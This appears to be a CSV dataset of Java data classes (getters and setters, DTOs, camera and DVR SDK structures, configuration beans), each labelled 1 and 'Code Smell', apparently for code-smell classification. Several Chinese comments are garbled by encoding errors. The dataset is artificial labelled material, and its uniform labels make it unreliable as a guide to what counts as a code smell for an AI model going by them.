text,label,text_label
"public static class DataBean {
  /** 
 * dataType : SquareTopicCard id : 245 title : 浣犲績涓紝涓鍙ユ渶浠や汉蹇冨姩鐨勮〃鐧 joinCount : 4381 viewCount : 27632 showHotSign : true actionUrl : eyepetizer://topic/detail?id=245 imageUrl : http://img.kaiyanapp.com/2620517918873b55306f991e404a07ce.gif haveReward : false ifNewest : true newestEndTime : 1580366259000
 */
  private String dataType;
  private int id;
  private String title;
  private int joinCount;
  private int viewCount;
  private boolean showHotSign;
  private String actionUrl;
  private String imageUrl;
  private boolean haveReward;
  private boolean ifNewest;
  private long newestEndTime;
  public String getDataType(){
    return dataType;
  }
  public void setDataType(  String dataType){
    this.dataType=dataType;
  }
  public int getId(){
    return id;
  }
  public void setId(  int id){
    this.id=id;
  }
  public String getTitle(){
    return title;
  }
  public void setTitle(  String title){
    this.title=title;
  }
  public int getJoinCount(){
    return joinCount;
  }
  public void setJoinCount(  int joinCount){
    this.joinCount=joinCount;
  }
  public int getViewCount(){
    return viewCount;
  }
  public void setViewCount(  int viewCount){
    this.viewCount=viewCount;
  }
  public boolean isShowHotSign(){
    return showHotSign;
  }
  public void setShowHotSign(  boolean showHotSign){
    this.showHotSign=showHotSign;
  }
  public String getActionUrl(){
    return actionUrl;
  }
  public void setActionUrl(  String actionUrl){
    this.actionUrl=actionUrl;
  }
  public String getImageUrl(){
    return imageUrl;
  }
  public void setImageUrl(  String imageUrl){
    this.imageUrl=imageUrl;
  }
  public boolean isHaveReward(){
    return haveReward;
  }
  public void setHaveReward(  boolean haveReward){
    this.haveReward=haveReward;
  }
  public boolean isIfNewest(){
    return ifNewest;
  }
  public void setIfNewest(  boolean ifNewest){
    this.ifNewest=ifNewest;
  }
  public long getNewestEndTime(){
    return newestEndTime;
  }
  public void setNewestEndTime(  long newestEndTime){
    this.newestEndTime=newestEndTime;
  }
}",1,Code Smell
"public final class VASPersonalVipNumberInfo {
  Integer appId;
  Integer itemId;
  Integer numberIdx;
  Integer numberItemId;
  public VASPersonalVipNumberInfo(){
  }
  public Integer getAppId(){
    return this.appId;
  }
  public Integer getItemId(){
    return this.itemId;
  }
  public Integer getNumberIdx(){
    return this.numberIdx;
  }
  public Integer getNumberItemId(){
    return this.numberItemId;
  }
  public String toString(){
    return ""VASPersonalVipNumberInfo{appId="" + this.appId + "",itemId=""+ this.itemId+ "",numberItemId=""+ this.numberItemId+ "",numberIdx=""+ this.numberIdx+ "",}"";
  }
  public VASPersonalVipNumberInfo(  Integer num,  Integer num2,  Integer num3,  Integer num4){
    this.appId=num;
    this.itemId=num2;
    this.numberItemId=num3;
    this.numberIdx=num4;
  }
}",1,Code Smell
"public class CfUserFriend implements Serializable {
  private String id;
  private String uid;
  private String friendId;
  private Long createTime;
  public CfUserFriend(){
  }
  public CfUserFriend(  String id,  String uid,  String friendId,  Long createTime){
    this.id=id;
    this.uid=uid;
    this.friendId=friendId;
    this.createTime=createTime;
  }
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id == null ? null : id.trim();
  }
  public String getUid(){
    return uid;
  }
  public void setUid(  String uid){
    this.uid=uid == null ? null : uid.trim();
  }
  public String getFriendId(){
    return friendId;
  }
  public void setFriendId(  String friendId){
    this.friendId=friendId == null ? null : friendId.trim();
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
}",1,Code Smell
"/** 
 * 寮�闂告暟鎹�
 */
public class GpioData implements Serializable {
  private String ionum;
  private String action;
  public String getIonum(){
    return ionum;
  }
  public void setIonum(  String ionum){
    this.ionum=ionum;
  }
  public String getAction(){
    return action;
  }
  public void setAction(  String action){
    this.action=action;
  }
}
",1,Code Smell
"public static class NET_CLOUD_UPGRADER_STATE extends SdkStructure {
  public int dwSize;
  public int emState;
  public int nProgress;
  public byte[] szFileName=new byte[NET_COMMON_STRING_128];
  public long nTotalLen;
  public NET_CLOUD_UPGRADER_STATE(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public static class NET_UAVCMD_LAND extends SdkStructure {
  public NET_UAVCMD_COMMON stuCommon;
  public float fYawAngle;
  public float fLatitude;
  public float fLongitude;
  public float fAltitude;
  public byte[] byReserved=new byte[12];
}",1,Code Smell
"public static class MimeType {
  public static int IMAGE=1;
  public static int AUDIO=2;
  public static int VIDEO=4;
  public static int DOCUMENT=8;
  public static int ARCHIVE=16;
  public static int LINK=32;
  public static int OTHERS=64;
  public static int ALL=IMAGE | AUDIO | VIDEO| DOCUMENT| ARCHIVE| LINK| OTHERS;
}",1,Code Smell
"public static class TcpTunnel {
  static AtomicInteger tunnelIds=new AtomicInteger(0);
  public final int tunnelId=tunnelIds.addAndGet(1);
  public long mySequenceNum=0;
  public long theirSequenceNum=0;
  public long myAcknowledgementNum=0;
  public long theirAcknowledgementNum=0;
  public TCBStatus tcbStatus=TCBStatus.SYN_SENT;
  public BlockingQueue<Packet> tunnelInputQueue=new ArrayBlockingQueue<Packet>(1024);
  public InetSocketAddress sourceAddress;
  public InetSocketAddress destinationAddress;
  public SocketChannel destSocket;
  private VpnService vpnService;
  BlockingQueue<ByteBuffer> networkToDeviceQueue;
  public int packId=1;
  public boolean upActive=true;
  public boolean downActive=true;
  public String tunnelKey;
  public BlockingQueue<String> tunnelCloseMsgQueue;
}",1,Code Smell
"/** 
 * Anthropic API connection properties.
 * @author Christian Tzolov
 * @since 1.0.0
 */
@ConfigurationProperties(AnthropicConnectionProperties.CONFIG_PREFIX) public class AnthropicConnectionProperties {
  public static final String CONFIG_PREFIX=""spring.ai.anthropic"";
  /** 
 * Anthropic API access key.
 */
  private String apiKey;
  /** 
 * Anthropic API base URL.
 */
  private String baseUrl=AnthropicApi.DEFAULT_BASE_URL;
  /** 
 * Anthropic API version.
 */
  private String version=AnthropicApi.DEFAULT_ANTHROPIC_VERSION;
  public String getApiKey(){
    return this.apiKey;
  }
  public void setApiKey(  String apiKey){
    this.apiKey=apiKey;
  }
  public String getBaseUrl(){
    return this.baseUrl;
  }
  public void setBaseUrl(  String baseUrl){
    this.baseUrl=baseUrl;
  }
  public String getVersion(){
    return this.version;
  }
  public void setVersion(  String version){
    this.version=version;
  }
}",1,Code Smell
"/** 
 * CacheClusterSet
 */
public class CacheClusterSetObject {
  private String setName;
  private String type;
  private List<CacheClusterObject> cacheClusters=new ArrayList<>();
  private List<CacheTopicObject> topics=new ArrayList<>();
  /** 
 * get setName
 * @return the setName
 */
  public String getSetName(){
    return setName;
  }
  /** 
 * set setName
 * @param setName the setName to set
 */
  public void setSetName(  String setName){
    this.setName=setName;
  }
  /** 
 * get type
 * @return the type
 */
  public String getType(){
    return type;
  }
  /** 
 * set type
 * @param type the type to set
 */
  public void setType(  String type){
    this.type=type;
  }
  /** 
 * get cacheClusters
 * @return the cacheClusters
 */
  public List<CacheClusterObject> getCacheClusters(){
    return cacheClusters;
  }
  /** 
 * set cacheClusters
 * @param cacheClusters the cacheClusters to set
 */
  public void setCacheClusters(  List<CacheClusterObject> cacheClusters){
    this.cacheClusters=cacheClusters;
  }
  /** 
 * get topics
 * @return the topics
 */
  public List<CacheTopicObject> getTopics(){
    return topics;
  }
  /** 
 * set topics
 * @param topics the topics to set
 */
  public void setTopics(  List<CacheTopicObject> topics){
    this.topics=topics;
  }
}
",1,Code Smell
"public static class NET_DVR_ETHERNET extends Structure {
  public byte[] sDVRIP=new byte[16];
  public byte[] sDVRIPMask=new byte[16];
  public int dwNetInterface;
  public short wDVRPort;
  public byte[] byMACAddr=new byte[MACADDR_LEN];
}",1,Code Smell
"public class AccountDTO {
  private Account account;
  private List<CloudTask> cloudTaskList;
  public Account getAccount(){
    return account;
  }
  public void setAccount(  Account account){
    this.account=account;
  }
  public List<CloudTask> getCloudTaskList(){
    return cloudTaskList;
  }
  public void setCloudTaskList(  List<CloudTask> cloudTaskList){
    this.cloudTaskList=cloudTaskList;
  }
}
",1,Code Smell
"/** 
 * An object containing the flags for each moderation category https://beta.openai.com/docs/api-reference/moderations/create
 */
@Data public class ModerationCategories {
  public boolean hate;
  @JsonProperty(""hate/threatening"") public boolean hateThreatening;
  @JsonProperty(""self-harm"") public boolean selfHarm;
  public boolean sexual;
  @JsonProperty(""sexual/minors"") public boolean sexualMinors;
  public boolean violence;
  @JsonProperty(""violence/graphic"") public boolean violenceGraphic;
}
",1,Code Smell
"public static class NET_SELFCHECK_INFO extends SdkStructure {
  public int dwSize;
  public int nAlarmIn;
  public int nAlarmOut;
  public NET_TIME stuTime;
  public byte[] szPlateNo=new byte[NET_MAX_PLATE_NUMBER_LEN];
  public byte[] szICCID=new byte[NET_MAX_SIM_LEN];
  public byte byOrientation;
  public byte byACCState;
  public byte byConstantElecState;
  public byte byAntennaState;
  public byte byReportStation;
  public byte byControlScreen;
  public byte byPOS;
  public byte byCoinBox;
  public int bTimerSnap;
  public int bElectronEnclosure;
  public int bTeleUpgrade;
  public int nHddNum;
  public NET_HDD_STATE[] stuHddStates=new NET_HDD_STATE[NET_MAX_DISKNUM];
  public Pointer pChannleState;
  public int nChannleNum;
  public int nChannelMax;
  public int emConnState;
  public int emHomeState;
  public byte[] szICCIDExInfo=new byte[NET_COMMON_STRING_256];
  public byte by3GState;
  public byte byWifiState;
  public byte byGpsState;
  public byte byBlackBoxState;
  public int nCpuUsage;
  public int nTemperature;
  public byte[] szVendor=new byte[32];
  public byte[] szFirmwareVersion=new byte[128];
  public byte[] szSecurityBaseLineVersion=new byte[8];
  public NET_GPS_STATUS_INFO stuGPSStatusInfo;
  public byte[] szNetworkOperName=new byte[32];
  public int emEmergencyStatus;
  public int emTamperAletStatus;
  public byte[] szImei=new byte[16];
  public int nGSMsignalStrength;
  public int nMcc;
  public int nMnc;
  public int nLAC;
  public int nCi;
  public int nAlarmInStatusNum;
  public int[] nAlarmInStatus=new int[32];
  public int nAlarmOutStatusNum;
  public int[] nAlarmOutStatus=new int[32];
  public byte[] szMasterSvrAddr=new byte[128];
  public byte[] szSlaveSvrAddr=new byte[128];
  public byte[] szSerialNo=new byte[48];
  public NET_SELFCHECK_INFO(){
    this.dwSize=this.size();
    for (int i=0; i < NET_MAX_DISKNUM; i++) {
      stuHddStates[i]=new NET_HDD_STATE();
    }
  }
}",1,Code Smell
"public class AccountDTO implements Serializable {
  private Long id;
  private String userName;
  private int age;
  private IDCard idCard;
  private List<Book> books;
  @RelationManyToMany(joinTable=""tb_role_mapping"",joinSelfColumn=""account_id"",joinTargetColumn=""role_id"",selfField=""id"") private List<Role> roles;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  public int getAge(){
    return age;
  }
  public void setAge(  int age){
    this.age=age;
  }
  public IDCard getIdCard(){
    return idCard;
  }
  public void setIdCard(  IDCard idCard){
    this.idCard=idCard;
  }
  public List<Book> getBooks(){
    return books;
  }
  public void setBooks(  List<Book> books){
    this.books=books;
  }
  public List<Role> getRoles(){
    return roles;
  }
  public void setRoles(  List<Role> roles){
    this.roles=roles;
  }
  @Override public String toString(){
    return ""AccountDTO{"" + ""id="" + id + "", userName='""+ userName+ '\''+ "", age=""+ age+ "", idCard=""+ idCard+ "", books=""+ books+ "", roles=""+ roles+ '}';
  }
}
",1,Code Smell
"public class GetHomePageResponse {
  public String api;
  @JSONField(name=""v"") public String version;
  public String ret;
  public GetHomePageData data;
}
",1,Code Smell
"@Data @NoArgsConstructor public class FileManagementQuery {
  public String projectId;
  public String keyword;
  public List<String> moduleIds;
  public String fileType;
  public String operator;
  public String storage=StorageType.MINIO.name();
  public List<String> hiddenIds=new ArrayList<>();
  public FileManagementQuery(  FileBatchProcessRequest batchProcessDTO){
    this.projectId=batchProcessDTO.getProjectId();
    this.keyword=batchProcessDTO.getCondition().getKeyword();
    this.moduleIds=batchProcessDTO.getModuleIds();
    this.fileType=batchProcessDTO.getFileType();
    if (MapUtils.isNotEmpty(batchProcessDTO.getCondition().getCombine())) {
      if (batchProcessDTO.getCondition().getCombine().get(""createUser"") != null) {
        this.operator=batchProcessDTO.getCondition().getCombine().get(""createUser"").toString();
      }
      if (batchProcessDTO.getCondition().getCombine().get(""storage"") != null) {
        this.storage=batchProcessDTO.getCondition().getCombine().get(""storage"").toString();
      }
    }
  }
  public FileManagementQuery(  FileMetadataTableRequest batchProcessDTO){
    this.projectId=batchProcessDTO.getProjectId();
    this.keyword=batchProcessDTO.getKeyword();
    this.moduleIds=batchProcessDTO.getModuleIds();
    this.fileType=batchProcessDTO.getFileType();
    if (MapUtils.isNotEmpty(batchProcessDTO.getCombine())) {
      if (batchProcessDTO.getCombine().get(""createUser"") != null) {
        this.operator=batchProcessDTO.getCombine().get(""createUser"").toString();
      }
      if (batchProcessDTO.getCombine().get(""storage"") != null) {
        this.storage=batchProcessDTO.getCombine().get(""storage"").toString();
      }
      if (batchProcessDTO.getCombine().get(""hiddenIds"") != null) {
        this.hiddenIds=JSON.parseArray(JSON.toJSONString(batchProcessDTO.getCombine().get(""hiddenIds"")));
      }
    }
  }
}
",1,Code Smell
"/** 
 * @author 47081
 * @version 1.0
 * @description \if ENGLISH_LANG<p> \else 澶槼鑳芥澘淇℃伅 \endif
 * @date 2020/8/11
 */
public class SOLARCELL_PANEL_INFO extends NetSDKLib.SdkStructure {
  /** 
 * 鐢靛帇锛堝崟浣嶏細浼忕壒锛�
 */
  public float fVoltage;
  /** 
 * 鐢垫祦锛堝崟浣嶏細瀹夊煿锛�
 */
  public float fElectricCurrent;
  /** 
 * 鍏呯數鍔熺巼
 */
  public float fChargingPower;
  /** 
 * 淇濈暀瀛楄妭
 */
  public byte[] byReserved=new byte[252];
}",1,Code Smell
"public final class GProVersionNews {
  String jumpFeedUrl;
  ArrayList<String> newsUrlList;
  String subtitle;
  String title;
  public GProVersionNews(){
    this.title="""";
    this.subtitle="""";
    this.newsUrlList=new ArrayList<>();
    this.jumpFeedUrl="""";
  }
  public String getJumpFeedUrl(){
    return this.jumpFeedUrl;
  }
  public ArrayList<String> getNewsUrlList(){
    return this.newsUrlList;
  }
  public String getSubtitle(){
    return this.subtitle;
  }
  public String getTitle(){
    return this.title;
  }
  public String toString(){
    return ""GProVersionNews{title="" + this.title + "",subtitle=""+ this.subtitle+ "",newsUrlList=""+ this.newsUrlList+ "",jumpFeedUrl=""+ this.jumpFeedUrl+ "",}"";
  }
  public GProVersionNews(  String str,  String str2,  ArrayList<String> arrayList,  String str3){
    this.title="""";
    this.subtitle="""";
    this.newsUrlList=new ArrayList<>();
    this.jumpFeedUrl="""";
    this.title=str;
    this.subtitle=str2;
    this.newsUrlList=arrayList;
    this.jumpFeedUrl=str3;
  }
}",1,Code Smell
"public static class SendAnimationData {
  public float x;
  public float y;
  public float width;
  public float height;
  public float currentScale;
  public float currentX;
  public float currentY;
  public float timeAlpha;
}
",1,Code Smell
"@Table(value=""tb_account"",dataSource=""ds2"",onSet=AccountOnSetListener.class) public class Account extends BaseEntity implements Serializable, AgeAware {
  private static final long serialVersionUID=1L;
  @Id(keyType=KeyType.Auto) @ColumnAlias(""account_id"") private Long id;
  @ColumnMask(Masks.CHINESE_NAME) private String userName;
  @ColumnAlias(""my_age"") private int age;
  private SexEnum sex;
  @NotBlank private Date birthday;
  @Column(typeHandler=Fastjson2TypeHandler.class) private Map<String,Object> options;
  private Boolean isDelete;
  private List<Article> articles;
  @Column(ignore=true) private String title;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  @Override public int getAge(){
    return age;
  }
  @Override public void setAge(  int age){
    this.age=age;
  }
  public SexEnum getSex(){
    return sex;
  }
  public void setSex(  SexEnum sex){
    this.sex=sex;
  }
  public Date getBirthday(){
    return birthday;
  }
  public void setBirthday(  Date birthday){
    this.birthday=birthday;
  }
  public Map<String,Object> getOptions(){
    return options;
  }
  public void setOptions(  Map<String,Object> options){
    this.options=options;
  }
  public void addOption(  String key,  Object value){
    if (options == null) {
      options=new HashMap<>();
    }
    options.put(key,value);
  }
  public Boolean getDelete(){
    return isDelete;
  }
  public void setDelete(  Boolean delete){
    isDelete=delete;
  }
  public List<Article> getArticles(){
    return articles;
  }
  public void setArticles(  List<Article> articles){
    this.articles=articles;
  }
  public String getTitle(){
    return title;
  }
  public void setTitle(  String title){
    this.title=title;
  }
  @Override public String toString(){
    return ""Account{"" + ""id="" + id + "", userName='""+ userName+ '\''+ "", age=""+ age+ "", sex=""+ sex+ "", birthday=""+ birthday+ "", options=""+ options+ "", isDelete=""+ isDelete+ "", articles=""+ articles+ "", title='""+ title+ '\''+ '}';
  }
}",1,Code Smell
"public static final class PlaybackInfoUpdate {
  private boolean hasPendingChange;
  public PlaybackInfo playbackInfo;
  public int operationAcks;
  public boolean positionDiscontinuity;
  public @DiscontinuityReason int discontinuityReason;
  public boolean hasPlayWhenReadyChangeReason;
  public @PlayWhenReadyChangeReason int playWhenReadyChangeReason;
  public PlaybackInfoUpdate(  PlaybackInfo playbackInfo){
    this.playbackInfo=playbackInfo;
  }
  public void incrementPendingOperationAcks(  int operationAcks){
    hasPendingChange|=operationAcks > 0;
    this.operationAcks+=operationAcks;
  }
  public void setPlaybackInfo(  PlaybackInfo playbackInfo){
    hasPendingChange|=this.playbackInfo != playbackInfo;
    this.playbackInfo=playbackInfo;
  }
  public void setPositionDiscontinuity(  @DiscontinuityReason int discontinuityReason){
    if (positionDiscontinuity && this.discontinuityReason != Player.DISCONTINUITY_REASON_INTERNAL) {
      Assertions.checkArgument(discontinuityReason == Player.DISCONTINUITY_REASON_INTERNAL);
      return;
    }
    hasPendingChange=true;
    positionDiscontinuity=true;
    this.discontinuityReason=discontinuityReason;
  }
  public void setPlayWhenReadyChangeReason(  @PlayWhenReadyChangeReason int playWhenReadyChangeReason){
    hasPendingChange=true;
    this.hasPlayWhenReadyChangeReason=true;
    this.playWhenReadyChangeReason=playWhenReadyChangeReason;
  }
}",1,Code Smell
"private static class TokenPattern {
  public final CachedPattern pattern;
  public int group=-1;
  public boolean lookbehind;
  public boolean greedy;
  public TokenPattern[] insideTokenPatterns;
  public String insideLanguage;
  public TokenPattern(  int group,  CachedPattern pattern){
    this.pattern=pattern;
    this.group=group;
  }
  public TokenPattern(  CachedPattern pattern,  TokenPattern... inside){
    this.pattern=pattern;
    this.insideTokenPatterns=inside;
  }
  public TokenPattern(  CachedPattern pattern,  String lang){
    this.pattern=pattern;
    this.insideLanguage=lang;
  }
  public TokenPattern(  int group,  CachedPattern pattern,  TokenPattern... inside){
    this.group=group;
    this.pattern=pattern;
    this.insideTokenPatterns=inside;
  }
}",1,Code Smell
"public class JobLogInfo implements Delayed {
  private String jobId;
  private JobIdentifier jobIdentifier;
  private int computeType;
  private long expired;
  private String customLog;
  private EJobLogType logType;
  public JobLogInfo(  String jobId,  JobIdentifier jobIdentifier,  int computeType,  long delay,  EJobLogType logType){
    this.jobId=jobId;
    this.jobIdentifier=jobIdentifier;
    this.computeType=computeType;
    this.expired=System.currentTimeMillis() + delay;
    this.logType=logType;
  }
  public JobLogInfo(){
  }
  public EJobLogType getLogType(){
    return logType;
  }
  public String getCustomLog(){
    return customLog;
  }
  public void setCustomLog(  String customLog){
    this.customLog=customLog;
  }
  public String getJobId(){
    return jobId;
  }
  public void setJobId(  String jobId){
    this.jobId=jobId;
  }
  public int getComputeType(){
    return computeType;
  }
  public void setComputeType(  int computeType){
    this.computeType=computeType;
  }
  public JobIdentifier getJobIdentifier(){
    return jobIdentifier;
  }
  public void setJobIdentifier(  JobIdentifier jobIdentifier){
    this.jobIdentifier=jobIdentifier;
  }
  @Override public long getDelay(  TimeUnit unit){
    return unit.convert(this.expired - System.currentTimeMillis(),TimeUnit.MILLISECONDS);
  }
  @Override public int compareTo(  Delayed o){
    return (int)(this.getDelay(TimeUnit.MILLISECONDS) - o.getDelay(TimeUnit.MILLISECONDS));
  }
}
",1,Code Smell
"public static class NET_FILE_STREAM_TYPE extends SdkStructure {
  public static final int NET_FILE_STREAM_TYPE_UNKNOWN=0;
  public static final int NET_FILE_STREAM_TYPE_NORMAL=1;
  public static final int NET_FILE_STREAM_TYPE_ALARM=2;
  public static final int NET_FILE_STREAM_TYPE_DETECTION=3;
}",1,Code Smell
"/** 
 * Stores state that is initialized when preparation completes. 
 */
private static final class PreparedState {
  public final SeekMap seekMap;
  public final TrackGroupArray tracks;
  public final boolean[] trackIsAudioVideoFlags;
  public final boolean[] trackEnabledStates;
  public final boolean[] trackNotifiedDownstreamFormats;
  public PreparedState(  SeekMap seekMap,  TrackGroupArray tracks,  boolean[] trackIsAudioVideoFlags){
    this.seekMap=seekMap;
    this.tracks=tracks;
    this.trackIsAudioVideoFlags=trackIsAudioVideoFlags;
    this.trackEnabledStates=new boolean[tracks.length];
    this.trackNotifiedDownstreamFormats=new boolean[tracks.length];
  }
}
",1,Code Smell
"public static class RiskInfosBean {
  /** 
 * type : 0 content : warn : false
 */
  private int type;
  private String content;
  private boolean warn;
  public int getType(){
    return type;
  }
  public void setType(  int type){
    this.type=type;
  }
  public String getContent(){
    return content;
  }
  public void setContent(  String content){
    this.content=content;
  }
  public boolean isWarn(){
    return warn;
  }
  public void setWarn(  boolean warn){
    this.warn=warn;
  }
}",1,Code Smell
"public class ComponentBindDBDTO {
  public Integer getComponentCode(){
    return componentCode;
  }
  public void setComponentCode(  Integer componentCode){
    this.componentCode=componentCode;
  }
  public Boolean getCreateFlag(){
    return createFlag;
  }
  public void setCreateFlag(  Boolean createFlag){
    this.createFlag=createFlag;
  }
  public String getDbName(){
    return dbName;
  }
  public void setDbName(  String dbName){
    this.dbName=dbName;
  }
  /** 
 * 缁勪欢绫诲瀷
 */
  private Integer componentCode;
  /** 
 * 鍒涘缓/瀵规帴
 */
  private Boolean createFlag;
  /** 
 * db 鍚嶇О
 */
  private String dbName;
}
",1,Code Smell
"/** 
 * ISO7816-4 APDU.
 */
public class APDUCommand {
  protected int cla;
  protected int ins;
  protected int p1;
  protected int p2;
  protected byte[] data;
  protected boolean needsLE;
  /** 
 * Constructs an APDU with no response data length field. The data field cannot be null, but can be a zero-length array.
 * @param cla  class byte
 * @param ins  instruction code
 * @param p1   P1 parameter
 * @param p2   P2 parameter
 * @param data the APDU data
 */
  public APDUCommand(  int cla,  int ins,  int p1,  int p2,  byte[] data){
    this(cla,ins,p1,p2,data,false);
  }
  /** 
 * Constructs an APDU with an optional data length field. The data field cannot be null, but can be a zero-length array. The LE byte, if sent, is set to 0.
 * @param cla     class byte
 * @param ins     instruction code
 * @param p1      P1 parameter
 * @param p2      P2 parameter
 * @param data    the APDU data
 * @param needsLE whether the LE byte should be sent or not
 */
  public APDUCommand(  int cla,  int ins,  int p1,  int p2,  byte[] data,  boolean needsLE){
    this.cla=cla & 0xff;
    this.ins=ins & 0xff;
    this.p1=p1 & 0xff;
    this.p2=p2 & 0xff;
    this.data=data;
    this.needsLE=needsLE;
  }
  /** 
 * Serializes the APDU in order to send it to the card.
 * @return the byte array representation of the APDU
 */
  public byte[] serialize(){
    ByteArrayOutputStream out=new ByteArrayOutputStream();
    out.write(this.cla);
    out.write(this.ins);
    out.write(this.p1);
    out.write(this.p2);
    out.write(this.data.length);
    out.write(this.data,0,this.data.length);
    if (this.needsLE) {
      out.write(0);
    }
    return out.toByteArray();
  }
  /** 
 * Serializes the APDU to human readable hex string format
 * @return the hex string representation of the APDU
 */
  public String toHexString(){
    byte[] raw=this.serialize();
    if (raw == null) {
      return """";
    }
    return Utils.bytesToHex(raw);
  }
  /** 
 * Returns the CLA of the APDU
 * @return the CLA of the APDU
 */
  public int getCla(){
    return cla;
  }
  /** 
 * Returns the INS of the APDU
 * @return the INS of the APDU
 */
  public int getIns(){
    return ins;
  }
  /** 
 * Returns the P1 of the APDU
 * @return the P1 of the APDU
 */
  public int getP1(){
    return p1;
  }
  /** 
 * Returns the P2 of the APDU
 * @return the P2 of the APDU
 */
  public int getP2(){
    return p2;
  }
  /** 
 * Returns the data field of the APDU
 * @return the data field of the APDU
 */
  public byte[] getData(){
    return data;
  }
  /** 
 * Returns whether LE is sent or not.
 * @return whether LE is sent or not
 */
  public boolean getNeedsLE(){
    return this.needsLE;
  }
}",1,Code Smell
"public static class EM_ATTACHMENT_TYPE extends SdkStructure {
  public static final int EM_ATTACHMENT_UNKNOWN=0;
  public static final int EM_ATTACHMENT_OTHER=1;
  public static final int EM_ATTACHMENT_FURNITURE=2;
  public static final int EM_ATTACHMENT_PENDANT=3;
  public static final int EM_ATTACHMENT_TISSUEBOX=4;
  public static final int EM_ATTACHMENT_DANGER=5;
  public static final int EM_ATTACHMENT_PERFUMEBOX=6;
}",1,Code Smell
"public static class NET_ORDINARY_INFO extends SdkStructure {
  public int bTempletState;
  public byte[] szDescription=new byte[MAX_COMMON_STRING_128];
  public int nWhnCount;
  public NET_GUIDESCREEN_WINDOW_INFO[] stuWindowsInfo=(NET_GUIDESCREEN_WINDOW_INFO[])new NET_GUIDESCREEN_WINDOW_INFO().toArray(MAX_WINDOWS_COUNT);
  public byte[] byReserved=new byte[128];
}",1,Code Smell
"public static class NET_DVR_VIDEO_INTERCOM_EVENT_INFO_UINON extends Union {
  public byte[] byLen=new byte[256];
  public NET_DVR_UNLOCK_RECORD_INFO struUnlockRecord=new NET_DVR_UNLOCK_RECORD_INFO();
  public NET_DVR_NOTICEDATA_RECEIPT_INFO struNoticedataReceipt=new NET_DVR_NOTICEDATA_RECEIPT_INFO();
  public NET_DVR_AUTH_INFO struAuthInfo=new NET_DVR_AUTH_INFO();
  public NET_DVR_UPLOAD_PLATE_INFO struUploadPlateInfo=new NET_DVR_UPLOAD_PLATE_INFO();
  public NET_DVR_SEND_CARD_INFO struSendCardInfo=new NET_DVR_SEND_CARD_INFO();
}",1,Code Smell
"@Component @ConfigurationProperties(prefix=""sip"",ignoreInvalidFields=true) @Order(0) public class SipConfig {
  private String ip;
  private String showIp;
  private Integer port;
  private String domain;
  private String id;
  private String password;
  Integer ptzSpeed=50;
  Integer registerTimeInterval=120;
  private boolean alarm;
  public void setIp(  String ip){
    this.ip=ip;
  }
  public void setPort(  Integer port){
    this.port=port;
  }
  public void setDomain(  String domain){
    this.domain=domain;
  }
  public void setId(  String id){
    this.id=id;
  }
  public void setPassword(  String password){
    this.password=password;
  }
  public void setPtzSpeed(  Integer ptzSpeed){
    this.ptzSpeed=ptzSpeed;
  }
  public void setRegisterTimeInterval(  Integer registerTimeInterval){
    this.registerTimeInterval=registerTimeInterval;
  }
  public String getIp(){
    return ip;
  }
  public Integer getPort(){
    return port;
  }
  public String getDomain(){
    return domain;
  }
  public String getId(){
    return id;
  }
  public String getPassword(){
    return password;
  }
  public Integer getPtzSpeed(){
    return ptzSpeed;
  }
  public Integer getRegisterTimeInterval(){
    return registerTimeInterval;
  }
  public boolean isAlarm(){
    return alarm;
  }
  public void setAlarm(  boolean alarm){
    this.alarm=alarm;
  }
  public String getShowIp(){
    if (this.showIp == null) {
      return this.ip;
    }
    return showIp;
  }
  public void setShowIp(  String showIp){
    this.showIp=showIp;
  }
}",1,Code Smell
"protected static class MoveInfo {
  public RecyclerView.ViewHolder holder;
  public int fromX, fromY, toX, toY;
  public MoveInfo(  RecyclerView.ViewHolder holder,  int fromX,  int fromY,  int toX,  int toY){
    this.holder=holder;
    this.fromX=fromX;
    this.fromY=fromY;
    this.toX=toX;
    this.toY=toY;
  }
}
",1,Code Smell
